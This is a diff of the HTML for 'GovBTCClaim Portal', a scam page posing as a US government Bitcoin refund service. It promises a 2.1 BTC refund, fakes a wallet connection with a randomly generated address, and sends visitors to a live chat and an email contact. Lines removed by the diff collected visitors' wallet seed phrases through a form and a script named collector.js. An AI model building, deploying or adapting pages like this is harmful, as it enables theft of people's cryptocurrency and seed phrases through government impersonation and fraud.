@@ -4,50 +4,112 @@
   <meta charset="UTF-8">
   <title>GovBTCClaim Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      text-align: center;
+      padding-top: 50px;
+      position: relative;
+    }
+    body::before {
+      content: "GOV | BTC | CLAIM";
+      font-size: 80px;
+      color: rgba(247, 147, 26, 0.05);
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 0;
+      white-space: nowrap;
+    }
+    .container {
+      background: white;
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      position: relative;
+      z-index: 1;
+    }
+    h2 {
+      color: #f7931a;
+    }
+    .btn {
+      background-color: #f7931a;
+      color: white;
+      padding: 12px 20px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .wallet-box {
+      margin-top: 25px;
+      background: #eee;
+      padding: 15px;
+      border-radius: 8px;
+      word-break: break-word;
+    }
+    .note, .btc-amount {
+      font-size: 13px;
+      color: #777;
+      margin-top: 10px;
+    }
+    .btc-amount {
+      color: #333;
+      font-size: 14px;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
     <h2>🇺🇸 Government BTC Refund</h2>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
+    
+    <div class="btc-amount">
+      Estimated Refund Amount: <br><span style="color:#f7931a;">2.1 BTC ≈ $115,000</span>
+    </div>
 
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
-    <div id="walletForm" style="display:none; margin-top:20px;">
-      <label for="walletType">Select Wallet Type:</label><br>
-      <select id="walletType" class="input-box">
-        <option value="MetaMask">MetaMask</option>
-        <option value="Trust Wallet">Trust Wallet</option>
-        <option value="Coinbase Wallet">Coinbase Wallet</option>
-        <option value="Other">Other</option>
-      </select><br><br>
-
-      <label for="seedPhrase">Enter your 12/24-word phrase:</label><br>
-      <textarea id="seedPhrase" rows="4" class="input-box" placeholder="e.g., word1 word2 word3..."></textarea><br><br>
-
-      <button class="btn" onclick="submitWallet()">Submit</button>
+    <div class="wallet-box" id="walletBox" style="display:none;">
+      <strong>Connected Wallet:</strong><br>
+      <span id="walletAddress">bc1qx6gh03rd5x9m2gea6syl8x2yat674jmenmd0uw</span>
     </div>
 
-    <div class="note">
-      If your wallet holds less than the expected balance, contact support via live chat or email <strong>admin@govbtcclaim.org</strong> for manual review.
-    </div>
+    <div class="note">Compatible with MetaMask, TrustWallet, or Coinbase Wallet.</div>
+    <div class="note">For inquiries, contact: admin@govbtcclaim.org</div>
   </div>
 
-  <!-- Scripts -->
-  <script src="js/connect.js"></script>
-  <script src="js/collector.js"></script>
+  <!-- Connect Wallet Script -->
+  <script>
+    function connectWallet() {
+      const walletBox = document.getElementById("walletBox");
+      const walletAddress = document.getElementById("walletAddress");
+      walletBox.style.display = "block";
+      const fakeAddress = "0x" + Math.random().toString(36).substring(2, 15);
+      walletAddress.textContent = fakeAddress;
+    }
+  </script>
 
   <!-- Tawk.to Live Chat -->
   <script type="text/javascript">
-    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
-    (function() {
-      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
-      s1.async = true;
-      s1.src = 'https://embed.tawk.to/686aa27570e7fd1919384314/1ivg8l7dr';
-      s1.charset = 'UTF-8';
-      s1.setAttribute('crossorigin', '*');
-      s0.parentNode.insertBefore(s1, s0);
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/686c82558d299b19083881aa/1hvnkmk4j';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
     })();
   </script>
+
 </body>
 </html>
